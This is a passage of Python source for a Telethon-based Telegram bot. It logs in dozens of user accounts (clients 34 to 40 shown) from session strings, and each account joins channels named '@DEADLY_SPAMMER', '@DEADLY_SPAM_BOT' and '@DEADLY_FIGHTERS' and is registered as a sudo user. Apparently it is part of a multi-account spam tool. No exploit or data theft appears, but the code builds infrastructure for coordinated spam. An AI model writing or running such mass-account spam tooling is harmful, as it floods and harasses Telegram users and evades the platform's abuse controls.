            await Deadly34(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly34.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 34 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly34 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly34.start()
        except Exception as e:
            pass
        
    
    if STRING35:
        session_name = str(STRING35)
        print("String 35 Found")
        Deadly35 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await Deadly35.start()
            await Deadly35(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly35(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly35(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly35.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 35 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly35 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly35.start()
        except Exception as e:
            pass


    if STRING36:
        session_name = str(STRING36)
        print("String 36 Found")
        Deadly36 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 36")
            await Deadly36.start()
            botme = await Deadly36.get_me()
            await Deadly36(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly36(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly36(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 36 not Found")
        session_name = "Deadlyxspam"
        Deadly36 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly36.start()
        except Exception as e:
            pass
   
    if STRING37:
        session_name = str(STRING37)
        print("String 37 Found")
        Deadly37 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 37")
            await Deadly37.start()
            botme = await Deadly37.get_me()
            await Deadly37(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly37(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly37(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 37 not Found")
        session_name = "Deadlyxspam"
        Deadly37 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly37.start()
        except Exception as e:
            pass
   
    if STRING38:
        session_name = str(STRING38)
        print("String 38 Found")
        Deadly38 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 38")
            await Deadly38.start()
            botme = await Deadly38.get_me()
            await Deadly38(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly38(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly38(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 38 not Found")
        session_name = "Deadlyxspam"
        Deadly38 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly38.start()
        except Exception as e:
            pass
   
    if STRING39:
        session_name = str(STRING39)
        print("String 39 Found")
        Deadly39 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 39")
            await Deadly39.start()
            botme = await Deadly39.get_me()
            await Deadly39(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly39(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly39(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 39 not Found")
        session_name = "Deadlyxspam"
        Deadly39 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly39.start()
        except Exception as e:
            pass
   
    if STRING40:
        session_name = str(STRING40)
        print("String 40 Found")
        Deadly40 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 40")
            await Deadly40.start()
            botme = await Deadly40.get_me()
            await Deadly40(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly40(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly40(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 40 not Found")
        session_name = "Deadlyxspam"
        Deadly40 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly40.start()
        except Exception as e:
            pass

loop = asyncio.get_event_loop()
loop.run_until_complete(DeadlyX())
